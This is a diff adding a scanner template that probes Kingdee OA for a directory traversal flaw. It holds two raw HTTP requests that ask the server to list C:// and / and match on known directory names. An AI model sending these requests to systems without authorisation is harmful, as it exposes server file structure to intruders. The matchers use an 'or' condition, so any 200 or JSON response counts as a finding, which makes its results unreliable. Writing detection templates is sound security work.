@@ -1,0 +1,48 @@
+id: kingdee-oa-directory-traversal
+info:
+  name: Kingdee OA Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    This template detects a directory traversal vulnerability in Kingdee OA by checking for sensitive directory paths in JSON responses.
+  reference:
+    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E8%9D%B6OA%20server_file%20%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
+
+http:
+  - raw:
+      - |
+        GET /appmonitor/protected/selector/server_file/files?folder=C://&suffix= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "{\"name\":\"Windows\",\"path\":\"C:\\\\Windows\",\"folder\":true}"
+
+  - raw:
+      - |
+        GET /appmonitor/protected/selector/server_file/files?folder=/&suffix= HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "{\"name\":\"root\",\"path\":\"/root\",\"folder\":true}"
